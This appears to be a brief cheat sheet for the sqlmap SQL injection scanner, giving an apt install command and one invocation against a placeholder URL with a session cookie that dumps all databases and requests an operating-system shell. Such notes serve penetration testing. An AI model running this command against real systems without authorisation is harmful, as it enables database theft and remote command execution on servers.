# sqlmap
SQL injection scanner

# Install
```bash
sudo apt install sqlmap -yq
```

# running
```bash
sqlmap -u <target_url> --cookie '<cookie info>' -a --dump-all --os-shell
```